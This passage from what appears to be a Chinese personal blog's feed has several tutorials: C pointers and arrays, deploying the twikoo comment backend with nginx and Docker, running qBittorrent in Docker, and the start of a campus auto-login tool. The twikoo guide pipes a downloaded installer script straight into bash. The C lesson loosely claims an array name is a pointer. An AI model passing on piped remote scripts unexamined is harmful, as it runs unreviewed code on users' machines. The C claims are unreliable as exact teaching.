class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><ul><li>向指针“问路”的过程，我们称为“解引用”。就是把指针里面的地址取出来，并且到达那个变量。</li></ul><hr><ul><li>有的时候，指针会很皮，如果我们一开始不跟它说它应该负责谁的地址，那么这个指针就会“乱指”。就是它会随便找个地方，指向它。那么我们可以想一想，如果有个变量b，它本来在好好工作，突然莫名其妙被指针误伤(free掉)，那么b变量就会很生气：“我明明没有打扰到谁啊，为啥要指我?”，如果b变量负责整个程序的关键部位(例如system)，那么b变量的罢工就会导致整个操作系统崩溃掉。所以为了避免这个问题，我们就出现了NULL指针，就是强行将指针指向系统不使用的区域。</li></ul><hr><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//当我么没想好指针应该让它指向谁的时候，我们可以使用NULL指针。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="偷懒带来的“好处”"><a href="#偷懒带来的“好处”" class="headerlink" title="偷懒带来的“好处”"></a>偷懒带来的“好处”</h3><p>我们都知道偷懒是肯定没用好处的，但是C语言的偷懒却带来了极大的灵活性。比如下文将从两个方面去说明这个好处。</p><hr><p>1.指针很灵活，对于C语言而言，一切皆为指针。</p><ul><li>还记得上面我们提到的关于字符数组的问题吗？C语言的确只会记住字符数组的第一个字符的地址，而且对于C语言而言，这个地址是作为不同字符串的区分。</li></ul><p>请看下面这个例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里的%p指的是以unsigned int的长度打印出值。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出的结果是这样子的：</p><blockquote><p>0x7fff0997e102</p></blockquote><blockquote><p>0x7fff0997e102</p></blockquote><blockquote><p>0x7fff0997e102</p></blockquote><p>是不是很惊讶，这里的三个结果是一样的！<br>那这能不能说明这三个等价呢？也就是 a = &amp;a[0] = ptr</p><p>即：“数组名(a)本质上也是一个指针(ptr)，他指向数组元素的第一个元素的地址(&amp;a[0])”</p><p>所以，数组名就是个指向内存块的指针！</p><p>我们都知道，字符数组和字符串、数字数组是不一样的，那么这个结论能否推广到数字数组呢？我们试试，看接下来的例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>pt <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>pt<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果是这样子的：</p><blockquote><p>0x7ffdbe898240</p></blockquote><blockquote><p>0x7ffdbe898240</p></blockquote><blockquote><p>0x7ffdbe898240</p></blockquote><p>那么由此我们可以发现，无论是否是字符串，数组名永远作为指针，指向数组一个个元素的地址。</p><p>所以我们就可以做出总结了：</p><p>数组名本质是一个指针，它指向这个数组的第一个元素的地址。</p><p>2.指针允许用户对内存进行分配。</p><p>通过以上的例子我们可以知道，数组和指针有着十分相似的关系。那么它们能否混合使用呢，答案是“一定条件下可以”。条件就是我们需要给指针分配内存块地址。而分配内存这一个操作，当我们定义数组的时候就已经被编译器自动执行了。这就是数组名和单独的指针的不同点。</p><p>C语言中内置了malloc函数，可以直接进行内存地址的分配。函数成功执行后会返回分配的内存块的首个地址，可以用指针进行接受，用完后请释放内存。</p><p>看这个例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配一块int类型的内存给ptr这个指针</span><span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//对指针的地址进行赋值操作</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印输出结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下：</p><blockquote><p>8</p></blockquote><p>本例子中使用malloc函数分配了内存给一个int类型的指针ptr，并且对其进行赋值，最后对这个指针解引用并且输出。</p><p>再看这个例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配八个int类型的内存块大小</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token comment">//利用循环进行赋值,每次指针向后移动一位</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出的结果为：</p><blockquote><p>01234567</p></blockquote><p>本例子中使用malloc函数分配了内存给一个int类型的指针ptr，一共分配了8个int类型的内存块大小，并且对其一一进行赋值，最后输出。</p><p>如果把原始代码中的*(ptr+j)更改为ptr[j],那么结果依旧是一样的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配八个int类型的内存块大小</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token comment">//利用循环进行赋值,每次指针向后移动一位</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这一行进行了更改</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：</p><blockquote><p>01234567</p></blockquote><p>这样子再一次证明了数组名就是指针的原理。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>C语言中，数组名就是一个指针，它指向数组所在内存块的首地址，如果对其解引用，便会得到数组第一个元素的值。</p></li><li><p>在C语言中，指针就是灵魂一般的存在，如果没有指针的存在，那么我们的C语言将会变得毫无活力，变得很不自由。也正是因为C语言有这种特性，才铸就了它的不可替代性，在今日仍是我们作为程序员必须掌握的技能之一。</p></li><li><p>不管语言如何发展，C语言永远有着不可或缺的地位。C语言是其他任何语言的基础，甚至是操作系统的基础。在它的基础之上，越来越多的高级语言发展起来，有的甚至“青出于蓝而胜于蓝”。但是我想作为对编程热爱的我们而言，我们必须始终记得C语言这位“长者”。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> C语言佛系教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 指针 </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>独立部署twikoo评论系统</title>
      <link href="/2022/10/13/%E7%8B%AC%E7%AB%8B%E9%83%A8%E7%BD%B2twikoo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/10/13/%E7%8B%AC%E7%AB%8B%E9%83%A8%E7%BD%B2twikoo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><ul><li>最近呢，总想把自己的博客完善一下。突然想到自己的博客的评论系统前段时间挂了，所以想解决一下。经过检查，发现是原来twikoo系统部署的后端链接挂了。然而重新部署一遍呢也无济于事。所以索性想到能不能摆脱第三方的依赖，自己搭建一个独立的后端服务。</li><li>经过一系列的查找呢，最终发现，！还真的有。twikoo的官方文档中就有对独立部署的说明。那么这就好办了，按照官方的说法照葫芦画瓢就行。</li></ul><h3 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h3><ul><li>按照官方的说法呢，我们总共需要准备三个东西。<blockquote><p>VPS，就是云服务器。<br>域名，后期会教大家怎么开启https<br>最后嘛，就是带上脑子。</p></blockquote></li></ul><h3 id="后端部署："><a href="#后端部署：" class="headerlink" title="后端部署："></a>后端部署：</h3><ul><li>好，咱们现在正式开始部署了。<br>1.购买VPS。<br>国内最主要的VPS服务商是阿里云、腾讯云、华为云等，自己拍拍自己的钱包，咱们按需购买。因为是用来搭建评论系统，那么选用最低的就行。而且很多商家其实新用户都有优惠。那么能薅羊毛咱们就使劲薅！<br>其实哪家的VPS都一样，看哪个顺眼就买哪个。<br>购买完成后记得记下自己服务器的ip地址，这边就以1.2.3.4为例。</li></ul><hr><p>2.购买域名。<br>一般来说，在你购买VPS的商家中也会有对应的域名购买服务。一般.com的域名会比较贵，而.xyz的域名是便宜的。<br>这边先购买域名，然后新建域名解析，这里我就用demo.com来进行演示。你需要把域名解析到自己的服务器的ip地址上。<br>如图所示，新建一个www解析（当然你也可以用@解析）</p><img src="/2022/10/13/%E7%8B%AC%E7%AB%8B%E9%83%A8%E7%BD%B2twikoo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/uTools_1666160268462.png" class="lazyload placeholder" data-srcset="/2022/10/13/%E7%8B%AC%E7%AB%8B%E9%83%A8%E7%BD%B2twikoo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/uTools_1666160268462.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="新建解析"><p>解析需要1-24小时不等的延时，之后我们需要打开shell，输入<br><code>ping www.demo.com</code>(记得把demo.com替换成你注册的域名)</p><ul><li>当出现如下所示的内容，那么恭喜你，域名解析完成了<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> F:\微软云盘\OneDrive\桌面&gt; ping www<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>com<span class="token comment"># 这里的demo.com仅供演示，实际上是你注册的域名</span>正在 Ping demo<span class="token punctuation">.</span>com <span class="token punctuation">[</span>1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span class="token punctuation">.</span>4<span class="token punctuation">]</span> 具有 32 字节的数据:来自 1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span class="token punctuation">.</span>4 的回复: 字节=32 时间=161ms TTL=48来自 1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span class="token punctuation">.</span>4 的回复: 字节=32 时间=155ms TTL=48来自 1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span class="token punctuation">.</span>4 的回复: 字节=32 时间=159ms TTL=48来自 1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span class="token punctuation">.</span>4 的回复: 字节=32 时间=140ms TTL=48<span class="token comment"># 这里的1.2.3.4仅供演示，实际过程中会显示为你服务器的iPv4地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><p>3.接下来是服务器的配置，稍微有点复杂。我们老样子，使用某ssh客户端连接到服务器</p><ul><li><p>第一步更新系统：<br>若你用的是Ubuntu系统（Debian衍生）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt</span> upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若你用的是CentOS系统（RedHat衍生）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum updateyum upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>第二步安装docker：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -fsSL https://get.docker.com <span class="token operator">|</span> <span class="token function">bash</span> -s <span class="token function">docker</span> --mirror Aliyun<span class="token comment"># 阿里云会使下载速度快</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>第三步安装nginx：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> nginx<span class="token comment"># 或者是</span>yum <span class="token function">install</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四步新建网站：<br>  我们需要打开nginx的配置目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/nginx/conf.d<span class="token comment"># 进入nginx配置目录</span><span class="token function">nano</span> www.demo.com<span class="token comment"># 编辑配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>  如果正常的话，它应该是空白的：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"> server{listen80;#端口server_namewww.zhangsb.com;#域名location /{proxy_pass http://127.0.0.1:8080 #转发}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  完成后使用<kbd>Ctrl</kbd>+<kbd>O</kbd>保存<br>  然后检查配置的合理性，并且重载nginx</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx -t <span class="token operator">&amp;&amp;</span> systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  如果输出以下内容，说明正常：</p><blockquote><p>nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok<br>nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</p></blockquote></li><li><p>第五步是部署twikoo：<br>  这个简单，直接粘贴命令就好</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run -p <span class="token number">8080</span>:8080 -v <span class="token variable">${<span class="token environment constant">PWD</span>}</span>/data:/app/data -d imaegoo/twikoo<span class="token comment">#以后这个文件夹下的data中的内容即为你的评论数据库，务必保留好</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  测试部署是否完成：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token number">127.0</span>.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  如果输出如下内容，congratulations！:</p><blockquote><p>{“code”:100,”message”:”Twikoo 云函数运行正常，请参考 <a href="https://twikoo.js.org/quick-start.html#%E5%89%8D%E7%AB%AF%E9%83%A8%E7%BD%B2">https://twikoo.js.org/quick-start.html#%E5%89%8D%E7%AB%AF%E9%83%A8%E7%BD%B2</a> 完成前端的配置”,”version”:”1.x.x”}</p></blockquote></li></ul><p>ok，到此为止，后端部署就完成了。</p><p>那么你的twikoo环境ID即为<a href="http://www.demo.com/">http://www.demo.com</a></p><h3 id="前端部署："><a href="#前端部署：" class="headerlink" title="前端部署："></a>前端部署：</h3><ul><li>接下来就开始部署前端的内容了。<br>关于前端内容，其实真的没有什么好讲的，不同的主题有不同的使用方法，具体可以参见主题的官方的使用文档。<br>一般情况下，配置文件会保存在themes文件夹下的_config.yml，直接开始twikoo评论，并且替换就好。<br>只需要找到对饮twikoo的一行执行替换就行。</li></ul><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>那么今天的twikoo部署教程就到这里了，希望对大家有所帮助。后期我可能会出一期给评论系统加上https的教程。请大家多多关注支持点赞哦！</li><li>By Littlewith!</li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Web </tag>
            
            <tag> Docker </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在开发板中部署Torrent下载器</title>
      <link href="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
      <url>/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>前段时间不是在自己的香橙派Orangepi上面部署了NAS嘛，但是突然想到单单给他NAS的工作未免有些太轻松了。所以本着能者多劳的原则，结合自己的实际情况，心想，我为何不稍加改造，把它变成一个下载器呢？这个东西反正24小时开机，用来当BT下载器那可是再合适不过了。于是就有了今天的这一篇博客。~</p><h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>采用何种部署方式是个问题，我考虑了一下，最终还是选择了Docker这种方法。<br>采用的原因我分为以下几点：<br>1.安全，Docker提供了隔离环境<br>2.兼容，只要能跑Docker的地方都能装上。<br>3.方便，出问题可以直接销毁重新安装。</p><h3 id="开始部署："><a href="#开始部署：" class="headerlink" title="开始部署："></a>开始部署：</h3><p>1.我们找一台服务器，同样的用ssh客户端(finashell,xshell等)连接到系统。（PS：当然也可以用公网的VPS，有公网环境会让下载速度倍增！）<br>2.更新系统：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Debian衍生系统,不推荐centos，因为有Bug</span><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3.安装docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">docker</span> docker.io<span class="token comment"># 推荐使用debian</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4.部署容器</p><ul><li><p>新建一个脚本文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编辑文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将下面的代码贴入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run -d <span class="token punctuation">\</span>  --name<span class="token operator">=</span>qbittorrent <span class="token punctuation">\</span>  -e <span class="token assign-left variable">PUID</span><span class="token operator">=</span><span class="token number">1000</span> <span class="token punctuation">\</span>  -e <span class="token assign-left variable">PGID</span><span class="token operator">=</span><span class="token number">1000</span> <span class="token punctuation">\</span>  -e <span class="token assign-left variable">TZ</span><span class="token operator">=</span>Asia/Shanghai <span class="token punctuation">\</span>  -e <span class="token assign-left variable">WEBUI_PORT</span><span class="token operator">=</span><span class="token number">8080</span> <span class="token punctuation">\</span>  -p <span class="token number">8080</span>:8080 <span class="token punctuation">\</span>  -p <span class="token number">6881</span>:6881 <span class="token punctuation">\</span>  -p <span class="token number">6881</span>:6881/udp <span class="token punctuation">\</span>  -v /etc/qbittorrent/config:/config <span class="token punctuation">\</span>  -v /home/download:/downloads <span class="token punctuation">\</span>  --restart unless-stopped <span class="token punctuation">\</span>  lscr.io/linuxserver/qbittorrent:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>保存文件<br><kbd>ctrl</kbd>+<kbd>O</kbd>,<kbd>ctrl</kbd>+<kbd>X</kbd></p></li><li><p>运行配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当我们看到返回一堆乱码（hash值）的时候，就说明部署完成了</p></li></ul><p>5.开放端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> ufw<span class="token comment"># 安装防火墙管理工具</span>ufw allow <span class="token number">8080</span> ufw allow <span class="token number">6881</span><span class="token comment"># 开放端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>到这一步呢我们就算是部署完成了，接下来我们这边打开浏览器，访问<a href="http://x.x.x.x:8080(中间的叉换成你的IP)；">http://x.x.x.x:8080(中间的叉换成你的IP)；</a><br>如果你看到这个界面,那么恭喜你，it works!</p><img src="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664981940847.png" class="lazyload placeholder" data-srcset="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664981940847.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="用户界面"><h3 id="登录使用"><a href="#登录使用" class="headerlink" title="登录使用"></a>登录使用</h3><ul><li><p>登录，我们这边输入默认的用户名admin,默认密码adminadmin登录UI。</p></li><li><p>由于是第一次登录我么需要更改中文</p><img src="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664982369507.png" class="lazyload placeholder" data-srcset="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664982369507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="用户界面"><p>这边我们点击Tools-&gt;Options-&gt;WebUI-&gt;Language-&gt;简体中文，然后拉到最下面点击save，这样子就是中文界面了.</p><img src="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664982582899.png" class="lazyload placeholder" data-srcset="/2022/10/03/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%83%A8%E7%BD%B2Torrent%E4%B8%8B%E8%BD%BD%E5%99%A8/uTools_1664982582899.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="用户界面"></li><li><p>想必接下来的操作就不用我多说了吧，这界面是不是跟比特彗星很像呢！只需要粘贴链接就能下载了。</p></li><li><p>tips:默认的下载目录在/home/download目录底下，只需要使用ftp等工具将下好的文件传回来就好了.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
            <tag> Bt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园网自动登录v2.0</title>
      <link href="/2022/09/26/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95v2-0/"/>
      <url>/2022/09/26/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95v2-0/</url>
      
        <content type="html"><![CDATA[<h3 id="iNuist-connetion-v2-0"><a href="#iNuist-connetion-v2-0" class="headerlink" title="iNuist_connetion_v2.0"></a>iNuist_connetion_v2.0</h3><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>前段时间发布了1.0版本的校园网登录程序，但是那个程序还是有很多的一些缺点：<blockquote><p>缺少配置文件，不能自定义运营商类型、用户名和密码。<br>使用ping的方式检测网络，当遇到TAP虚拟网卡的情况时就无法进行有效判断了。</p></blockquote></li><li>针对以上情况，我抽时间开发出了2.0版本的登陆系统。</li></ul><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>1.此次更新新增加了配置文件conf.json，用户可以通过修改这个文件来实现自定义用户名等的配置信息。<br>2.修复了网络检测的Bug，不再采用ping的方式进行检测网络，而改成直接访问外网的方式。<br>3.增加了配置文件的检查功能，帮助用户排错。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><ul><li><p>下载（Download）<br>这边提供了两个版本，一个是只有主程序、chromium和配置文件的；另一个是目录式的。<br>我们这边选择目录式的版本进行介绍。<br>点击<a href="https://github.com/littlewith/iNuist_auto_login/releases/download/iNuist_v2.0/iNuist-Login_multi.7z">这里</a>进行下载</p></li><li><p>解压(Extracting)<br>随便解压到哪里，最好不要在C盘。这边解压到D盘。<br>接着我们先进入目录，找到主程序:iNuist-Login.exe，右键发送到桌面快捷方式。</p></li><li><p>相关设置(Settings)<br>然后我们打开目录中的config.json文件，它应该是这样的:</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"objects"</span><span class="token operator">:</span><span class="token punctuation">[</span> 